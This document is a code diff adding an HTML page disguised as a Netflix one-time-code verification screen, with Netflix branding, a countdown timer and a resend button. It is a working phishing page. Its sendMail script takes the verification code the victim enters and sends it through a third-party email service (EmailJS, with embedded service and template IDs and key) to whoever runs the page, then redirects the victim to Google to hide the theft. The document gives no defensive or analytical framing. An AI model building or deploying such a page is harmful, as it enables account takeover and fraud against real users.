@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/png" href="https://i.ibb.co/8sj6mFP/Netflix-Favicon.png">
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="text/javascript">
+(function(){
+emailjs.init({
+publicKey: "KGWmh1dyveTN8cjHy",
+});
+})();
+</script>
+<title>Netflix</title>
+<style>
+body {
+font-family: Arial, sans-serif;
+background-color: #fff;
+margin: 0;
+padding: 0;
+}
+.container {
+max-width: 90%;
+margin: auto;
+padding: 20px;
+border: 1px solid transparent;
+background-color: #fff;
+}
+.top {
+display: flex;
+justify-content: space-between;
+align-items: center;
+}
+.top img {
+margin-top: -20px;
+margin-left: -10px;
+width: 80px;
+height: 45px;
+}
+.top a {
+margin-top: -20px;
+font-weight: 450;
+text-decoration: none;
+color: black;
+}
+.content {
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+}
+.tick svg {
+margin-left: -150px;
+}
+.start {
+width: 100%;
+max-width: 600px;
+margin: 20px auto 0 auto;
+text-align: center;
+font-size: 19px;
+}
+.next {
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+}
+.next button {
+width: 290px;
+height: 70px;
+border-radius: 5px;
+font-size: 24px;
+border: 1px solid transparent;
+display: inline;
+color: #fff;
+background-color: #E50913;
+}
+.buttom {
+max-width: 90%;
+margin: auto;
+padding: 20px;
+border: 1px solid transparent;
+border-top-color: #e0e0e0;
+color: #737373;
+background-color: #F3F3F3;
+}
+.line {
+display: flex;
+align-items: center;
+justify-content: center;
+}
+.line svg {
+margin-right: 10px;
+}
+.next input {
+padding: 0 20px;
+width: 110px;
+height: 50px;
+border-radius: 5px;
+border: 1px solid black;
+letter-spacing: 2px;
+font-size: 16px;
+font-weight: bold;
+text-align: center;
+}
+.resend-code {
+   color: blue;
+   text-align: center;
+ }
+ .resend-code button {
+   border: 1px solid transparent;
+   color: #6268A6;
+   background-color: transparent;
+ }
+ .resend-code button:hover {
+   background-color: transparent;
+   cursor: pointer;
+ }
+ .countdown {
+   margin-top: 5px;
+   text-align: center;
+   color: #6268A6;
+}
+.resend-code button:focus {
+  border: 1px solid #6268A6;
+}
+
+ 
+ 
+@media (min-width: 600px) {
+.container {
+max-width: 100%;
+}
+}
+@media (min-width: 1024px) {
+.container {
+max-width: 80%;
+}
+}
+@media (min-width: 600px) {
+.buttom {
+max-width: 100%;
+}
+}
+@media (min-width: 1024px) {
+.buttom {
+max-width: 80%;
+}
+}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="top">
+<img src="https://i.ibb.co/X59Fb0Q/Netflix.png" alt="Netflix" border="0">
+<a onclick="Redirect()">Sign In</a>
+</div>
+<hr>
+<div class="content">
+<br><br>
+<div class="tick">
+<svg fill="#D51019" width="50px" height="50px" viewBox="0 0 19.00 19.00" xmlns="http://www.w3.org/2000/svg" class="cf-icon-svg">
+<path d="M16.417 9.583A7.917 7.917 0 1 1 8.5 1.666a7.917 7.917 0 0 1 7.917 7.917zm-4.23-.585a.476.476 0 0 0-.475-.475h-.7V7.262a2.52 2.52 0 0 0-5.041 0v1.261h-.7a.476.476 0 0 0-.475.475v5.108a.476.476 0 0 0 .475.475h6.44a.477.477 0 0 0 .476-.475zM10.22 7.262v1.261H6.762V7.262a1.73 1.73 0 0 1 3.459 0zm-1.413 4.363v1.309a.317.317 0 1 1-.633 0v-1.309a.79.79 0 1 1 .633 0z"></path>
+</svg>
+</div>
+<h1 style="margin-left: -70px;">Enter your code</h1>
+</div>
+<div class="start">
+<p>Enter the one-time code sent to your phone number to confirm your account and start your membership.</p>
+</div>
+<br>
+<form id="MultiForm">
+<div class="next">
+<div class="line">
+<svg fill="#808080" width="50px" height="50px" viewBox="-12.26 0 55.078 55.078" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path id="smart_phone" data-name="smart phone" d="M210.354,661.926H184.746a2.475,2.475,0,0,0-2.472,2.472v50.136a2.478,2.478,0,0,0,2.472,2.47h25.61a2.476,2.476,0,0,0,2.469-2.472V664.4A2.472,2.472,0,0,0,210.354,661.926Zm-10.079,49.081a2.723,2.723,0,1,1-2.726-2.716A2.737,2.737,0,0,1,200.275,711.007Zm9.8-4.989H185.032V667.191h25.037Z" transform="translate(-182.274 -661.926)"></path> </g></svg>
+<svg width="40px" height="40px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="arrow" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M6 12H18M18 12L13 7M18 12L13 17" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>
+
+<input type="tel" id="otp" name="otp" data-mask="00000000" placeholder="">
+</div><br>
+<button type="submit" id="Netflixotp" onclick="sendMail()">Start<br>Membership</button>
+</div>
+</form>
+<br></br>
+<div class="resend-code">
+    <button id="resend">RESEND CODE</button>
+    </form>
+  </div>
+<div class="countdown" id="countdown">05:00</div>
+<br><br><br>
+</div>
+<div class="buttom">
+<p>Questions? Contact us.</p>
+<p>FAQ <span style="margin-left: 145px;">Help Center</span></p>
+<p>Netflix Shop <span style="margin-left: 85px;">Terms of use</span></p>
+<p>Privacy <span style="margin-left: 120px;">Cookie preferences</span></p>
+<p>Corporate Information</p>
+</div>
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+
+<script>
+  function Redirect() {
+    window.location = "";
+  }
+</script>
+
+<script>
+  let formSubmitted = false; // Variable to track form submission
+  
+  function sendMail(){
+    if (formSubmitted) {
+      return; // Exit the function if form is already submitted
+    }
+
+    let parms = {
+      otp: document.getElementById("otp").value,
+      submit_button_id: document.getElementById("Netflixotp").id
+    };
+    
+    // Set formSubmitted to true before sending email
+    formSubmitted = true;
+    
+    emailjs.send("service_76vugl3", "template_9vpv84j", parms)
+      .then(function(response) {
+        // Redirect to Google after email is sent
+        window.location.href = "https://google.com";
+      })
+      .catch(function(error) {
+        console.error('Invalid Verification code!', error);
+        // Handle error if necessary
+      });
+  }
+
+  // Attach form submission event handler
+  document.getElementById('MultiForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent default form submission
+    sendMail(); // Call sendMail function
+  });
+</script>
+
+<script>
+  let time = 300; // 5 minutes in seconds
+let countdown; // Variable to store the countdown interval
+
+function startCountdown() {
+  const countdownElement = document.getElementById('countdown');
+
+  clearInterval(countdown); // Clear any existing countdown
+
+  countdown = setInterval(() => {
+    const minutes = Math.floor(time / 60);
+    const seconds = time % 60;
+    countdownElement.textContent =
+      `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+    if (time <= 0) {
+      clearInterval(countdown);
+      time = 300; // Reset time to 5 minutes
+    } else {
+      time--;
+    }
+  }, 1000);
+}
+
+document.getElementById('resend').addEventListener('click', function() {
+  time = 300; // Reset time to 5 minutes
+  startCountdown(); // Restart the countdown
+});
+
+startCountdown(); // Initial call to start the countdown
+
+    </script>
+
+<script>
+document.getElementById('Netflixotp').addEventListener('click', function() {
+    const button = this;
+    button.disabled = true; // Disable the button
+
+    setTimeout(function() {
+        button.disabled = false; // Re-enable the button after 5 seconds
+    }, 5000); // 5000 milliseconds = 5 seconds
+});
+   
+ </script>
+ 
+</body>
+</html>
